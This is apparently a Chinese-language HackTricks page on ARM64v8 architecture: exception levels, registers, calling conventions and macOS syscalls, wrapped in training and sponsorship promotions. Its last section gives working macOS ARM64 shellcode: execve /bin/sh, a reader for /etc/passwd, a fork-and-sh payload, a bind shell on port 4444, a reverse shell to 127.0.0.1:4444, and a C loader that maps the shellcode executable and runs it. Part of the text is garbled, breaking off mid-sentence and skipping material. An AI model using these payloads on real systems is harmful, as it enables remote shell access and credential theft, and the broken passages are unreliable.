# ARM64v8简介

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上**关注**我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **异常级别 - EL（ARM64v8）**

在ARMv8架构中，执行级别，称为异常级别（ELs），定义了执行环境的特权级别和功能。有四个异常级别，从EL0到EL3，每个都有不同的目的：

1. **EL0 - 用户模式**：
* 这是最低特权级别，用于执行常规应用程序代码。
* 在EL0上运行的应用程序彼此之间以及与系统软件隔离，增强安全性和稳定性。
2. **EL1 - 操作系统内核模式**：
* 大多数操作系统内核在此级别运行。
* EL1比EL0具有更多特权，并且可以访问系统资源，但受一些限制以确保系统完整性。
3. **EL2 - 虚拟化模式**：
* 此级别用于虚拟化。在EL2上运行的虚拟机监视程序可以管理在同一物理硬件上运行的多个操作系统（每个操作系统在其自己的EL1中）。
* EL2提供了用于隔离和控制虚拟化环境的功能。
4. **EL3 - 安全监视器模式**：
* 这是最高特权级别，通常用于安全引导和受信任执行环境。
* EL3可以管理和控制安全和非安全状态之间的访问（例如安全引导，受信任操作系统等）。

使用这些级别可以以结构化和安全的方式管理系统的不同方面，从用户应用程序到最高特权的系统软件。ARMv8对特权级别的处理有助于有效隔离不同的系统组件，从而增强系统的安全性和稳健性。

## **寄存器（ARM64v8）**

ARM64有**31个通用寄存器**，标记为`x0`到`x30`。每个寄存器可以存储一个**64位**（8字节）的值。对于需要仅使用32位值的操作，可以使用相同的寄存器以32位模式访问，名称为w0到w30。

1. **`x0`**到**`x7`** - 这些通常用作临时寄存器和用于向子例程传递参数。
* **`x0`**还携带函数的返回数据
2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中使用x16！**
3. **`x9`**到**`x15`** - 更多临时寄存器，通常用于本地变量。
4. **`x16`**和**`x17`** - **过程内调用寄存器**。用于立即值的临时寄存器。它们还用于间接函数调用和PLT（过程链接表）存根。
* **`x16`**在**macOS**中用作**`svc`**指令的**系统调用号**。
5. **`x18`** - **平台寄存器**。它可以用作通用寄存器，但在某些平台上，此寄存器保留用于特定平台用途：在Windows中用作当前线程环境块的指针，或者在Linux内核中用作指向当前**执行任务结构**的指针。
6. **`x19`**到**`x28`** - 这些是被调用者保存的寄存器。函数必须保留这些寄存器的值供调用者使用，因此它们存储在堆栈中，并在返回给调用者之前恢复。
7. **`x29`** - **帧指针**，用于跟踪堆栈帧。当由于调用函数而创建新的堆栈帧时，**`x29`**寄存器被**存储在堆栈中**，并将新的帧指针地址（**`sp`**地址）**存储在此寄存器中**。
* 此寄存器也可以用作**通用寄存器**，尽管通常用作**本地变量的引用**。
8. **`x30`**或**`lr`**- **链接寄存器**。在执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时，将**返回地址**存储在此寄存器中通过将**`pc`**值存储在此寄存器中。
* 它也可以像其他寄存器一样使用。
9. **`sp`** - **堆栈指针**，用于跟踪堆栈顶部。
* **`sp`**值应始终保持至少**四字对齐**，否则可能会发生对齐异常。
10. **`pc`** - **程序计数器**，指向下一条指令。此寄存器只能通过异常生成、异常返回和分支来更新。可以读取此寄存器的唯一普通指令是带链接的分支指令（BL、BLR）以将**`pc`**地址存储在**`lr`**（链接寄存器）中。
11. **`xzr`** - **零寄存器**。在其**32**位寄存器形式中也称为**`wzr`**。可用于轻松获取零值（常见操作）或使用**`subs`**执行比较，例如**`subs XZR，Xn，＃10`**将结果数据存储在**`xzr`**中。

**`Wn`**寄存器是**`Xn`**寄存器的**32位**版本。

### SIMD和浮点寄存器

此外，还有另外**32个长度为128位的寄存器**，可用于优化的单指令多数据（SIMD）操作和执行浮点运算。这些称为Vn寄存器，尽管它们也可以以**64**位、**32**位、**16**位和**8**位运行，然后称为**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**和**`Bn`**。

### 系统寄存器

**数百个系统寄存器**，也称为特殊目的寄存器（SPRs），用于**监视**和**控制****处理器**的行为。\
只能使用专用特殊指令**`mrs`**和**`msr`**读取或设置这些特殊寄存器。

在逆向工程中通常会发现特殊寄存器**`TPIDR_EL0`**和**`TPIDDR_EL0`**。`EL0`后缀表示可以从中访问寄存器的**最小异常**（在本例中，EL0是常规程序运行的异常级别）。\
它们通常用于存储**内存中线程本地存储**区域的**基址**。通常第一个对于在EL0中运行的程序是可读写的，但第二个可以从EL0读取并从EL1写入（如内核）。

* `mrs x0, TPIDR_EL0 ; 将TPIDR_EL0读入x0`
* `msr TPIDR_EL0, X0 ; 将x0写入TPIDR_EL0`

### **PSTATE**

**PSTATE**包含几个进程组件，序列化到操作系统可见的**`SPSR_ELx`**特殊寄存器中，其中X是**触发的权限级别**的**权限**。\
这些是可访问的字段：

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**、**`Z`**、**`C`**和**`V`**条件标志：
* **`N`**表示操作产生了负结果
* **`Z`**表示操作产生了零
* **`C`**表示操作进行了
* **`V`**表示操作产生了有符号溢出：
* 两个正数的和产生负结果。
* 两个负数的和产生正结果。
* 在减法中，当从较小的正数中减去较大的负数（或反之），并且结果无法表示在给定位大小范围内时。

{% hint style="warning" %}
并非所有指令都会更新这些标志。一些指令，如**`CMP`**或**`TST`**会，而具有s后缀的其他指令，如**`ADDS`**也会。
{% endhint %}

* 当前**寄存器宽度（`nRW`）**标志：如果标志的值为0，则程序在恢复后将在AArch64执行状态下运行。
* 当前**异常级别**（**`EL`**）：在EL0中运行的常规程序将具有值0
* **单步执行**标志（**`SS`**）：调试器使用此标志进行单步执行，通过异常将SS标志设置为1。程序将运行一步并发出单步执行异常。
* **非法异常**状态标志（**`IL`**）：用于标记特权软件执行无效的异常级别转移，此标志设置为1，处理器触发非法状态异常。
* **`DAIF`**标志：这些标志允许特权程序有选择地屏蔽某些外部异常。
* 如果**`A`**为1，则表示将触发**异步中止**。**`I`**配置为响应外部硬件**中断请求**（IRQs）。F与**快速中断请求**（FIRs）相关。
* **堆栈指针选择**标志（**`SPS`**）：在EL1及以上运行的特权程序可以在使用自己的堆栈指针寄存器和用户模型之间切换（例如，在`SP_EL1`和`EL0`之间）。通过写入**`SPSel`**特殊寄存器执行此切换。无法从EL0执行此操作。

## **调用约定（ARM64v8）**

ARM64调用约定指定函数的**前八个参数**通过寄存器**`x0`到`x7`**传递。**额外**参数通过**堆栈**传递。返回值通过寄存器**`x0`**传回，如果其为128位长，则也可以通过**`x1`**传回。必须在函数调用之间**保留**寄存器**`x19`**到**`x30`**和**`sp`**。

在汇编中阅读函数时，查找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置新帧指针**和**分配堆栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。

### Swift中的调用约定

Swift有自己的**调用约定**，可以在[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)中找到。

## **常见指令（ARM64v8）**

ARM64指令通常具有**格式`opcode dst, src1, src2`**，其中**`opcode`**是要执行的操作（如`add`、`sub`、`mov`等），**`dst`**是将结果存储的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。也可以使用立即值代替源寄存器。

* **`mov`**：将一个值从一个**寄存器**移动到另一个寄存器。
* 示例：`mov x0, x1` — 这将从`x1`移动的值到`x0`。
* **`ldr`**：将**内存**中的值**加载**到**寄存器**中。
* 示例：`ldr x0, [x1]` — 这将从`x1`指向的内存位置加载的值到`x0`。
* **`str`**：将**寄存器**中的值**存储**到**内存**中。
* 示例：`str x0, [x1]` — 这将`x0`中的值存储到`x1`指向的内存位置。
* **`ldp`**：**加载一对寄存器**。此指令从**连续内存**位置加载两个寄存器。内存地址通常是通过将另一个寄存器中的值与偏移量相加来形成的。
* 示例：`ldp x0, x1, [x2]` — 这将从`x2`和`x2 + 8`的内存位置分别加载`x0`和`x1`。
* **`stp`**：**存储一对寄存器**。此指令将两个寄存器存储到**连续内存**位置。内存地址通常是通过将另一个寄存器中的值与偏移量相加来形成的。
* 示例：`stp x0, x1, [x2]` — 这将`x0`和`x1`存储到`x2`和`x2 + 8`的内存位置。
* **`add`**：将两个寄存器的值相加并将结果存储在一个寄存器中。
* 语法：add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> 目标
* Xn2 -> 操作数1
* Xn3 | #imm -> 操作数2（寄存器或立即数）
* \[shift #N | RRX] -> 执行移位或调用RRX
* 示例：`add x0, x1, x2` — 这将`x1`和`x2
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **返回**: `ret`（使用链接寄存器中的地址将控制返回给调用者）

## AARCH32 执行状态

Armv8-A 支持执行 32 位程序。**AArch32** 可以在 **两种指令集**之一中运行：**`A32`** 和 **`T32`**，并可以通过 **`interworking`** 在它们之间切换。\
**特权** 64 位程序可以通过执行例外级别转移到较低特权的 32 位程序来调度 **执行 32 位** 程序。\
请注意，从 64 位到 32 位的过渡发生在例外级别的降低时（例如，EL1 中的 64 位程序触发 EL0 中的程序）。当 `AArch32` 进程线程准备好执行时，通过将 **`SPSR_ELx`** 特殊寄存器的 **第 4 位设置为 1** 来完成这一过渡，`SPSR_ELx` 的其余部分存储 **`AArch32`** 程序的 CPSR。然后，特权进程调用 **`ERET`** 指令，使处理器转换到 **`AArch32`** 进入 A32 或 T32，具体取决于 CPSR**。**

**`interworking`** 使用 CPSR 的 J 和 T 位。`J=0` 和 `T=0` 表示 **`A32`**，`J=0` 和 `T=1` 表示 **T32**。这基本上意味着将 **最低位设置为 1** 以指示指令集为 T32。\
这是在 **interworking 分支指令** 中设置的，但也可以直接使用其他指令设置，当 PC 被设置为目标寄存器时。示例：

另一个示例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 寄存器

有16个32位寄存器（r0-r15）。**从r0到r14**它们可以用于**任何操作**，但其中一些通常被保留：

- **`r15`**：程序计数器（始终）。包含下一条指令的地址。在A32中为当前 + 8，在T32中为当前 + 4。
- **`r11`**：帧指针
- **`r12`**：函数内调用寄存器
- **`r13`**：堆栈指针
- **`r14`**：链接寄存器

此外，寄存器在**`banked registries`**中备份。这些地方存储寄存器的值，允许在异常处理和特权操作中执行**快速上下文切换**，避免每次手动保存和恢复寄存器的需要。\
这是通过**将处理器状态从`CPSR`保存到所采取的处理器模式的`SPSR`**来完成的。在异常返回时，**从`SPSR`恢复`CPSR`**。

### CPSR - 当前程序状态寄存器

在AArch32中，CPSR的工作方式类似于AArch64中的**`PSTATE`**，当发生异常时也存储在**`SPSR_ELx`**中以便稍后恢复执行：

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

这些字段分为一些组：

- 应用程序状态寄存器（APSR）：算术标志，可从EL0访问
- 执行状态寄存器：进程行为（由操作系统管理）。

#### 应用程序状态寄存器（APSR）

- **`N`**，**`Z`**，**`C`**，**`V`**标志（就像在AArch64中一样）
- **`Q`**标志：在执行专门的饱和算术指令时，当**整数饱和发生**时设置为1。一旦设置为**`1`**，它将保持该值，直到手动设置为0。此外，没有任何隐式检查其值的指令，必须通过手动读取来完成。
- **`GE`**（大于或等于）标志：用于SIMD（单指令，多数据）操作，例如“并行加法”和“并行减法”。这些操作允许在单个指令中处理多个数据点。

例如，**`UADD8`**指令**并行添加四对字节**（来自两个32位操作数），并将结果存储在32位寄存器中。然后，基于这些结果，它**在`APSR`中设置`GE`标志**。每个GE标志对应于一个字节加法，指示该字节对的加法是否**溢出**。

**`SEL`**指令使用这些GE标志执行条件操作。

#### 执行状态寄存器

- **`J`**和**`T`**位：**`J`**应为0，如果**`T`**为0，则使用指令集A32，如果为1，则使用T32。
- **IT块状态寄存器**（`ITSTATE`）：这些是位10-15和25-26。它们存储**`IT`**前缀组内指令的条件。
- **`E`**位：指示**字节序**。&#x20;
- **模式和异常掩码位**（0-4）：它们确定当前的执行状态。第**5**个指示程序是否以32位（1）或64位（0）运行。其他4个表示当前正在使用的**异常模式**（当发生异常并正在处理时）。设置的数字表示在处理此异常时，如果触发另一个异常，则**当前优先级**。

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：可以使用位**`A`**，`I`，`F`来禁用某些异常。如果**`A`**为1，则表示将触发**异步中止**。**`I`**配置为响应外部硬件**中断请求**（IRQs）。F与**快速中断请求**（FIRs）有关。

## macOS

### BSD系统调用

查看[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD系统调用将具有**x16 > 0**。

### Mach陷阱

查看[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)。Mach陷阱将具有**x16 < 0**，因此您需要使用前一列表中的数字调用带有**减号**的函数：**`_kernelrpc_mach_vm_allocate_trap`**是**`-10`**。

您还可以在反汇编器中检查**`libsystem_kernel.dylib`**，以找出如何调用这些（以及BSD）系统调用：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
有时候检查来自`libsystem_kernel.dylib`的**反编译**代码比检查**源代码**更容易，因为几个系统调用（BSD和Mach）的代码是通过脚本生成的（请检查源代码中的注释），而在dylib中，您可以找到正在被调用的内容。
{% endhint %}

### Shellcodes

编译：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
要提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>用于测试shellcode的C代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行解释。

{% tabs %}
{% tab title="使用 adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="使用堆栈" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### 使用cat命令读取

目标是执行`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是一个参数数组（在内存中表示为地址的堆栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 通过从 fork 中使用 sh 调用命令，使主进程不被杀死
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### 绑定 shell

从 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 获取在**端口 4444**上的绑定 shell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 反向 shell

从 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) 获取 revshell 到 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
